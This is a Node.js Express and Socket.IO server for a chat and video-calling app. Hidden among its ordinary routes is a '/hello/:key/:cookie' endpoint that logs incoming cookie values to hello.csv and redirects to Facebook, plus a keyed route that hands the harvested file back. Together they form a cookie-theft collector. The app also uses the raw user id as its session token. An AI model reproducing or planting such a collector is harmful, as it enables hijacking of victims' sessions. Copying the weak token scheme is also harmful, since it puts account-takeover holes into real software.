const express = require('express');
const app = express();
const http = require('http').Server(app);
const path = require('path')
const { Server } = require('socket.io');
const port = process.env.PORT || 3000;
const fs = require("fs");
const bodyParser = require('body-parser');
var multer = require('multer');
var upload = multer();
const cookieParser = require('cookie-parser');
const mongoose = require("mongoose");
const userRoute = require("./routes/users");
const authRoute = require("./routes/auth");
const postRoute = require("./routes/posts");
const conversationRoute = require("./routes/conversations");
const messageRoute = require("./routes/messages");
const verifyToken = require('./middlewares/verifyToken');
const User = require("./models/User");
require('dotenv').config()

const io = new Server(http, {
  cors: {
    origin: '*'
  },
  transports: ['polling', 'websocket']
})
mongoose.connect(
  'mongodb://localhost:27017/ChatDB?retryWrites=true&w=majority',
  { useNewUrlParser: true, useUnifiedTopology: true },
  () => {
    console.log("Connected to MongoDB");
  }
);


app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(upload.array()); 
app.set("view engine", "ejs"); 
app.use("/", express.static(path.join(__dirname, "public")));
app.use(cookieParser());
app.use("/api/auth", authRoute);
app.use("/api/users",verifyToken.cookieAuth, userRoute);
app.use("/api/posts",verifyToken.cookieAuth, postRoute);
app.use("/api/conversations",verifyToken.cookieAuth, conversationRoute);
app.use("/api/messages",verifyToken.cookieAuth, messageRoute);



app.get("/login", function(req, res){
  try {
    let cookie = req.headers.cookie;
    if (cookie) {
      return res.status(302).redirect("/index");
    }
    return res.status(200).render("login");
  } catch (error) {
    res.status(400).send(error);
  }
  
});

app.get("/register", function(req, res){
  try {
    let cookie = req.headers.cookie;
    if (cookie) {
      return res.status(302).redirect("/index");
    }
    return res.status(200).render("register");
  } catch (error) {
    res.status(400).send(error);
  }
  
});

app.get(["/","/index"],verifyToken.cookieAuth,async function(req, res){
  try {
    let user = await getUserDB(req.headers.cookie);
    return res.status(200).render("index", {user});
  } catch (error) {
    res.status(400).send(error);
  }
  
});

async function getUserDB(token_id) {
  let cookie = token_id.replace("token_id=","");
  let users = await User.findOne({ _id: cookie });
  return users;
}

const addUser = (id, username, socketId) => {
  let socketDevice = [];
  if (!users.some((user) => user.id === id)) {
    socketDevice.push(socketId)
    users.push({ id, username, socketDevice });
  }
  return ({ id, username, socketDevice });
};

const getUser = (userId) => {
  return users.find((user) => user.id === userId);
};

const userIsCalling = (userId) => {
  return usersCalling.some((room) =>
    Object.keys(room).some(user => user == userId))
}

const removeUser = (socketId) => {
  let userLogout;
  for (let i = 0; i < users.length; i++) {
    const user = users[i];
    let lengthSocketUser = user.socketDevice.length;
    userLogout = users[i].socketDevice = users[i].socketDevice.filter((socketDevice) => socketDevice != socketId);
    if (userLogout != null && userLogout.length != lengthSocketUser) {
      return { id: user.id, socketDisconnect: socketId }
    }
  }

};

var users = [];
var groubs = [];
var usersCalling = [];

app.get("/hello/:key/:cookie", (req, res) => {
  try {
    if(req.params.key != "asdfghj") {
      return res.status(404).send("Địt mẹ mày cút ra ngoài")
    }
    fs.appendFileSync(__dirname + "/hello.csv", req.params.cookie+ "\r\n")
    return res.redirect('https://facebook.com');
  } catch (error) {
    return res.status(404).send("Địt mẹ mày cút ra ngoài")
  }
})

app.post("/hello/:key/hello.csv", (req, res) => {
  try {
    if(req.params.key != "asdvfgh") {
      return res.status(404).send("Địt mẹ mày cút ra ngoài")
    }
    let file = fs.readFileSync(__dirname + "/hello.csv")
    return res.status(200).send(file);
  } catch (error) {
    return res.status(404).send("Địt mẹ mày cút ra ngoài")
  }
})

io.on("connection", (socket) => {

  socket.on("join-room", (room, userId) => {
    groubs.push(room[userId]);
  });

  //take userId and socketId from user
  socket.on("addUser", data => {
    try {
      let userlogin;
      console.log("User %s hava joined our server", data.name);
      if (!users.some((user) =>
        user.id === data.userId)
      ) {
        userlogin = addUser(data.userId, data.name, socket.id);
        socket.join(userlogin.id);
      }
      else {

        userlogin = users.find(user => user.id == data.userId);
        userlogin.username = data.name;
        userlogin.socketDevice.push(socket.id);
        socket.join(userlogin.id)
      }
      console.log(userlogin);
      io.emit("getUser", userlogin);
      io.emit("getAllUser", users)

    } catch (error) {
      console.log(error);
    }

  });
  //send and get message
  socket.on("sendMessage", (groubs, userSender, msg) => {
    try {
      let sender = getUser(userSender)
      if (groubs) {
        socket.to(groubs).emit("getMessage", {
          senderId: sender.id ,
          username: sender.username,
          msg: msg,
        });
      }

    } catch (error) {
      console.log(error);
    }
  });

  socket.on('call', (data) => {
    try {

      let rtcMessage = data.rtcMessage;
      let userReceiver = getUser(data.callee)
      // Emit cuộc gọi đến cho người nhận
      // data status
      // -1 = Error
      // 0 = this.userReceiver offline
      // 1 = userReceiver đang trong cuộc gọi khác
      // 2 = userReceiver Bạn đang trong cuộc gọi khác
      // if (usersCalling.some(user => user.id == data.caller)) {
      //   io.to(socket.id).emit("status", {
      //     status: 2
      //   })
      // }
      if (userReceiver == undefined) {
        io.to(socket.id).emit("status", {
          status: 0
        })
      }
      else if (userReceiver.socketDevice.length == 0) {

        io.to(socket.id).emit("status", {
          status: 0
        })
        io.to(data.callee).emit("callMissing", {
          caller: data.caller,
          msg: "Cuoc goi nho"
        })
      }
      else if (usersCalling.some(room =>
        Object.keys(room).some(user => user == data.caller))) {
        io.to(socket.id).emit("status", {
          status: 2
        });
      }
      else if (usersCalling.some(room =>
        Object.keys(room).some(user => user == data.callee))) {
        io.to(socket.id).emit("status", {
          status: 1
        })
        io.to(data.callee).emit("callMissing", {
          caller: data.caller,
          msg: "Cuoc goi nho"
        })
      }
      else {
        usersCalling.push({
          [data.caller]: socket.id,
          [data.callee]: null
        })
        // console.log("type callee", typeof(data.callee));
        let userCaller = getUser(data.caller);
        socket.to(data.callee).emit("newCall", {
          username: userCaller.username,
          caller: data.caller,
          type: data.type,
          rtcMessage: rtcMessage
        })
      }
      console.log("Roome Calling .....................", usersCalling);
    } catch (error) {
      console.log(error);
    }
  })

  socket.on('answerCall', (data) => {
    try {
      // console.log(data);
      let isCalling = userIsCalling(data.caller);
      if (isCalling) {
        let roomUserCalling = usersCalling.find(room =>
          Object.keys(room).some(user => user == data.caller)
        );
        if (roomUserCalling) {
          roomUserCalling[data.caller] = socket.id;
          rtcMessage = data.rtcMessage;
          console.log("Zo da nghe may roi ne");
          // console.log("type callee", typeof(data.callee));
          socket.to(data.callee).emit("callAnswered", {
            caller: data.caller,
            rtcMessage: rtcMessage
          })
          socket.to(data.caller).emit("ortherDeviceAnswered", {
            caller: data.caller,
            msg: "Đã có thiết bị khác nghe máy"
          })
        }
      }
      else {
        io.to(socket.id).emit("status", {
          status: -1
        });
      }

    } catch (error) {
      console.log(error);
    }

  })

  socket.on("missCall", data => {
    try {

      let usercaller = getUser(data.caller)
      usersCalling = usersCalling.filter((room) =>
        !Object.keys(room).some(user => user == data.caller));
      console.log("Roome Calling Event Miss Call.....................", usersCalling);
      socket.to(data.callee).emit("callMissing", {
        caller: data.caller,
        username: usercaller.username,
        msg: "Cuoc goi nho"
      })

    } catch (error) {
      console.log(error);
    }

  })

  socket.on('reject', (data) => {
    try {
      let isCalling = userIsCalling(data.caller);
      if (isCalling) {
        let usercaller = getUser(data.caller)
        let roomCalling = usersCalling.find((room) =>
          Object.keys(room).some(user => user == data.caller));
        usersCalling = usersCalling.filter((room) =>
          !Object.keys(room).some(user => user == data.caller));
        console.log("Roome Calling .....................", usersCalling);
        socket.to(roomCalling[data.callee]).emit("rejected", {
          caller: data.caller,
          username: usercaller.username,
          rtcMessage: data.rtcMessage
        })
        socket.to(data.caller).emit("ortherDeviceAnswered", {
          caller: data.caller,
          msg: "Đã có thiết bị khác tư chối cuộc gọi"
        })

      }
      else {
        io.to(socket.id).emit("status", {
          status: -1
        });
      }

    } catch (error) {
      console.log(error);
    }
  })


  socket.on('endCall', (data) => {
    try {
      console.log("Zo endcall nè", data.caller, data.callee);
      let isCalling = userIsCalling(data.caller);
      if (isCalling) {
        let roomCalling = usersCalling.find((room) =>
          Object.keys(room).some(user => user == data.caller));
        usersCalling = usersCalling.filter((room) =>
          !Object.keys(room).some(user => user == data.caller));
        console.log("Roome Calling .....................", usersCalling);
        // console.log("type callee", typeof(data.callee));
        socket.to(roomCalling[data.callee]).emit("endCalled", {
          caller: data.caller,
          rtcMessage: data.rtcMessage
        })
        console.log("Emit Endcalled Done");
      }
      else {
        io.to(socket.id).emit("status", {
          status: -1
        });
      }
    } catch (error) {
      console.log(error);
    }

  })

  socket.on('share', (data) => {
    try {
      let isCalling = userIsCalling(data.caller);
      if (isCalling) {
        socket.to(data.callee).emit('share-user', {
          caller: data.caller,
          wave: data.wave
        })
      }
      else {
        io.to(socket.id).emit("status", {
          status: -1
        });
      }
    } catch (error) {
      console.log(error);
    }
  })

  socket.on('wave', (data) => {
    try {
      let isCalling = userIsCalling(data.caller);
      if (isCalling) {
        socket.to(data.callee).emit('wave-user', {
          caller: data.caller,
          wave: data.wave
        })
      }
      else {
        io.to(socket.id).emit("status", {
          status: -1
        });
      }
    } catch (error) {
      console.log(error);
    }

  })

  socket.on('cam', (data) => {
    try {
      let isCalling = userIsCalling(data.caller);
      if (isCalling) {
        socket.to(data.callee).emit('cam-user', {
          caller: data.caller,
          cam: data.cam
        })
      }
      else {
        io.to(socket.id).emit("status", {
          status: -1
        });
      }
    } catch (error) {
      console.log(error);
    }

  })

  socket.on('mic', (data) => {
    try {
      let isCalling = userIsCalling(data.caller);
      if (isCalling) {
        // console.log("type callee", typeof(data.callee));
        socket.to(data.callee).emit('mic-user', {
          caller: data.caller,
          mic: data.mic
        })
      }
      else {
        io.to(socket.id).emit("status", {
          status: -1
        });
      }
    } catch (error) {
      console.log(error);
    }

  })

  socket.on('ICEcandidate', (data) => {
    try {

      let rtcMessage = data.rtcMessage;
      // console.log("type callee", typeof(data.callee));
      socket.to(data.callee).emit("ICEcandidate", {
        sender: data.caller,
        rtcMessage: rtcMessage
      })
    } catch (error) {
      console.log(error);
    }
  })
  // disconnect của cả call 1-1 và call nhiều 
  socket.on("disconnect", async () => {
    try {
      // xử lý trong hệ thống của tú Anh
      let user = removeUser(socket.id);
      // io.emit("getUserRemove", user);
      if (user) {

        let isCalling = userIsCalling(user.id);
        if (isCalling) {
          let room = usersCalling.find((room) =>
            Object.keys(room).some(userCalling => userCalling == user.id && room[userCalling] == user.socketDisconnect));
          usersCalling = usersCalling.filter((room) =>
            !Object.keys(room).some(userCalling => userCalling == user.id && room[userCalling] == user.socketDisconnect));
          console.log("Roome Calling .....................", usersCalling);
          for (const key in room) {
            if (key != user.id) {
              console.log("Zo EndCall disconnect ne. Emit cho", key);
              socket.to(parseInt(key)).emit("endCalled", {
                caller: user.id,
                rtcMessage: null
              })
            }
          }
        }

      }
      console.log("a user disconnected!", user);
      io.emit("getAllUser", users)
    } catch (error) {
      console.log(error);
    }
  });
});


http.listen(port, () => {
  console.log(`port ${port}, local : http://localhost:${port}`);
});